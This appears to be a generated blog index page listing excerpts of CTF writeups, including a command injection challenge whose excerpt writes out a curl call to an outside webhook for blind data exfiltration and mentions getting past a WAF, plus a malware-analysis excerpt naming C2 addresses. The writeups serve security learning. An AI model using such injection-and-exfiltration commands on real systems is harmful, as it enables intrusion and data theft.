@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq90i0uzl9");
+    </script>
+    <!-- Microsoft Clarity ends-->
+    <!-- Google tag (gtag.js) begins-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'AW-16453505124');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+
+    typo
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <div class="post-list">
+  
+  <section class="post-item">
+    <a class="post-item-title" href="/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/">2024 AIS3 EOF CTF Qual writeup</a>
+    <div class="post-item-summary">
+      webnslookup final有command injection，用&#96;&#96;把指令包起來，但是會有一個問題就是他不會回傳結果，
+curl webhook.trianglesnake.com/?text=123
+
+呼叫聊天機器人webhook試試看，有收到訊息，所以直接把flag偷出來
+因為有WAF限制flag、*，但我知道flag的prefix了，所以直接遍歷根目錄檔案找出flag
+`curl -G https://eec1-182-234-154-17.n
+      <a class="read-more" href="/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/"> ... </a>
+    </div>
+    <div class="post-item-extra">
+      <div class="date">2024.02.06</div>
+      <div class="tags">
+        
+        <div class="tag-item">writeup</div>
+        
+        <div class="tag-item">CTF</div>
+        
+        <div class="tag-item">command injection</div>
+        
+        <div class="tag-item">SQLi</div>
+        
+        <div class="tag-item">web</div>
+        
+        <div class="tag-item">reverse</div>
+        
+      </div>
+    </div>
+  </section>
+  
+  <section class="post-item">
+    <a class="post-item-title" href="/2023/12/20/OT-CTF-writeup/">OT CTF writeup</a>
+    <div class="post-item-summary">
+      惡意軟體分析
+[name&#x3D;trianglesnake]flag:||10.15.1.69:3128||難度:中
+
+
+打開ida pro
+查看import table
+查看是否有網路連線相關api
+查看 WinHttpOpen functoin的Reference
+在edi中找到中繼伺服器ip和port
+
+惡意軟體分析2
+[name&#x3D;trianglesnake]flag:||flag{5.39.218.152}||
+
+加密系統
+[name&#x3D;tria
+      <a class="read-more" href="/2023/12/20/OT-CTF-writeup/"> ... </a>
+    </div>
+    <div class="post-item-extra">
+      <div class="date">2023.12.20</div>
+      <div class="tags">
+        
+        <div class="tag-item">writeup</div>
+        
+        <div class="tag-item">CTF</div>
+        
+      </div>
+    </div>
+  </section>
+  
+  <section class="post-item">
+    <a class="post-item-title" href="/2023/05/29/picoCTF-writeup/">picoCTF 2023 writeup</a>
+    <div class="post-item-summary">
+      Binary ExploitationhijackingAUTHOR: THEONESTE BYAGUTANGAZA
+
+Description
+Getting root access can allow you to read the flag. Luckily there is a 
+python file that you might like to play with.
+Through Social engineering, we&#39;ve got the cred
+      <a class="read-more" href="/2023/05/29/picoCTF-writeup/"> ... </a>
+    </div>
+    <div class="post-item-extra">
+      <div class="date">2023.05.29</div>
+      <div class="tags">
+        
+        <div class="tag-item">writeup</div>
+        
+        <div class="tag-item">CTF</div>
+        
+      </div>
+    </div>
+  </section>
+  
+</div>
+
+
+<div class="paginator">
+  <a class="extend prev" rel="prev" href="/">&lt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+</div>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © TriangleSnake</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
